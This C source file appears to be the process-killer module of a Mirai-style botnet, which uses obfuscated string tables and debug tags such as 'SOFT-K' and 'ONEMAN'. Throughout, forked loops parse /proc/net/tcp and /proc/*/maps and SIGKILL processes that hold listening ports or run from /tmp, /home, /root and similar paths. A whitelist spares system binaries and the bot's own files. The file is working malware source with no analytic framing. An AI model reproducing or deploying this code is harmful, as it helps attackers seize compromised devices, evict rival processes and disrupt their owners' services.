#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid = -1;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_tcp_init(char *cmdline)
{
    // Let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    sleep(1);

#ifdef DEBUG
    printf("[SOFT-K] killer is running in tcp connection sniff mode\n");
#endif
    while (1)
    {
        DIR *dir, *fd_dir;
        struct dirent *entry, *fd_entry;
        char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
        int pid = 0, fd = 0;
        char inode[16] = {0};
        char *ptr_path = path;

        table_unlock_val(TABLE_KILLER_PROC);
        table_unlock_val(TABLE_KILLER_EXE);
        table_unlock_val(TABLE_KILLER_FD);
        table_unlock_val(TABLE_KILLER_TCP);

        fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
        if (fd == -1)
        {
            table_lock_val(TABLE_KILLER_TCP);
            return;
        }
        table_lock_val(TABLE_KILLER_TCP);

        while (util_fdgets(buffer, 512, fd) != NULL)
        {
            int i = 0, ii = 0;

            while (buffer[i] != 0 && buffer[i] != ':')
                i++;

            if (buffer[i] == 0) continue;
            i += 2;
            ii = i;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;


            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            if (util_strlen(inode) == 0)
            {
                table_lock_val(TABLE_KILLER_PROC);
                table_lock_val(TABLE_KILLER_EXE);
                table_lock_val(TABLE_KILLER_FD);
                return;
            }

            if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
            {
                while ((entry = readdir(dir)) != NULL)
                {
                    char *pid = entry->d_name;

                    // skip all folders that are not PIDs
                    if (*pid < '0' || *pid > '9')
                        continue;

                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    if ((fd_dir = opendir(path)) != NULL)
                    {
                        while ((fd_entry = readdir(fd_dir)) != NULL)
                        {
                            char *fd_str = fd_entry->d_name;

                            util_zero(exe, PATH_MAX);
                            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                            util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                            util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                            if (readlink(path, exe, PATH_MAX) == -1)
                                continue;

                            if (util_stristr(exe, util_strlen(exe), inode) != -1)
                            {
#ifdef DEBUG
                                printf("[SOFT-K] found listening state from pid %d\n", util_atoi(pid, 10));
#endif
                                char cmdline_path[64], *ptr_cmdline_path = cmdline_path;

                                table_unlock_val(TABLE_KILLER_CMDLINE);
                                ptr_cmdline_path += util_strcpy(ptr_cmdline_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                                ptr_cmdline_path += util_strcpy(ptr_cmdline_path, pid);
                                ptr_cmdline_path += util_strcpy(ptr_cmdline_path, table_retrieve_val(TABLE_KILLER_CMDLINE, NULL));
                                table_lock_val(TABLE_KILLER_CMDLINE);

                                if (cmdline_check(cmdline_path, cmdline) == 1)
                                {
#ifdef DEBUG
                                    printf("[SOFT-K] skipping this process as it is ours\n", cmdline_path);
#endif
                                    util_zero(cmdline_path, sizeof (cmdline_path));
                                    continue;
                                }
#ifdef DEBUG
                                printf("[SOFT-K] PID %d has been killed\n", util_atoi(pid, 10));
#endif
                                kill(util_atoi(pid, 10), 9);
                                util_zero(cmdline_path, sizeof (cmdline_path));
                            }
                        }

                        closedir(fd_dir);
                    }
                }

                closedir(dir);
            }
        }
#ifdef DEBUG
        printf("[SOFT-K] network scan finnished\n");
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        close(fd);
        sleep(5);
    }

    return;
}

void killer_maps() {
	#ifdef DEBUG
    printf("[ONEMAN] Searching...\n"); 
	#endif
    DIR *dir;
    struct dirent *file;
    dir = opendir("/proc/");
    while(file = readdir(dir)) {
    int i;
    int a;
    int fd, pid;
    char rdmaps[100], rdmapspath[25];

    pid = atoi(file->d_name);
    
    if(pid == getpid() || pid == getppid() || pid == 0) goto end; // Skipping system procs, our proc, and non pid dirs.
  
    sprintf(rdmapspath, "/proc/%d/maps", pid); // Putting pid into readable directory

    fd = open(rdmapspath, O_RDONLY);
    read(fd, rdmaps, sizeof(rdmaps) - 1); 
    close(fd);  
    /* This Is Our Whitelist For Sys Process's - Enemyy */
  if(strstr(rdmaps, "/usr/lib/systemd/systemd") ||    
   strstr(rdmaps, "/usr/libexec/openssh/sftp-server") ||   
   strstr(rdmaps, "/usr/bin") ||    
   strstr(rdmaps, "/usr/sbin") ||   
   strstr(rdmaps, "/usr/lib") ||    
   strstr(rdmaps, "/var/lib") ||    
   strstr(rdmaps, "/var/spool") ||  
   strstr(rdmaps, "/tmp/BabyOne") ||
   strstr(rdmaps, "sshd") ||        
   strstr(rdmaps, "bash") ||        
   strstr(rdmaps, "httpd") ||       
   strstr(rdmaps, "telnetd") ||     
   strstr(rdmaps, "dropbear") ||    
   strstr(rdmaps, "ropbear") ||     
   strstr(rdmaps, "encoder")) goto end;       

  /* Common Dir's Which Malware Get Executed In */
  if(strstr(rdmaps, "/tmp") ||            
   strstr(rdmaps, "/var/run/") || ///mnt
   strstr(rdmaps, "/mnt") ||
   strstr(rdmaps, "/root") ||
   strstr(rdmaps, "/var/tmp") ||
   strstr(rdmaps, "/boot") ||
   strstr(rdmaps, "/.") ||           
   strstr(rdmaps, "(deleted)") ||     
   strstr(rdmaps, "/home")) kill(pid,9);

     end:;
     memset(rdmaps, 0, sizeof(rdmaps)); 
  }
}
void killer_boot() {
    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == 1) return;
    while(1) {
        killer_maps();
        sleep(2);
    }
}

static int cmdline_check(char *cmdline_path, char *ignore)
{
    int fd;
    char cmdline_buf[128];

    if ((fd = open(cmdline_path, O_RDONLY)) == -1)
        return 0;

    if (read(fd, cmdline_buf, sizeof(cmdline_buf)) < 0)
    {
        close(fd);
        return 0;
    }

    close(fd);

    table_unlock_val(TABLE_KILLER_SOFIA);
    if (util_mem_exists(cmdline_buf, util_strlen(cmdline_buf), ignore, util_strlen(ignore)) || util_mem_exists(cmdline_buf, util_strlen(cmdline_buf), table_retrieve_val(TABLE_KILLER_SOFIA, NULL), 10))
    {
		#ifdef DEBUG
        printf("[killer] avoiding process '%s'\n", cmdline_buf);
		#endif
        util_zero(cmdline_buf, sizeof(cmdline_buf));
        table_lock_val(TABLE_KILLER_SOFIA);
        return 1;
    }

    table_lock_val(TABLE_KILLER_SOFIA);

    util_zero(cmdline_buf, sizeof(cmdline_buf));
    return 0;
}

void killer_kill(void)
{
    if (killer_pid != -1)
        kill(killer_pid, 9);

    killer_pid = -1;
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if (fd == -1)
    {
        table_lock_val(TABLE_KILLER_TCP);
        return 0;
    }
    table_lock_val(TABLE_KILLER_TCP);

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef DEBUG
                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
#else
                        kill(util_atoi(pid, 10), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}
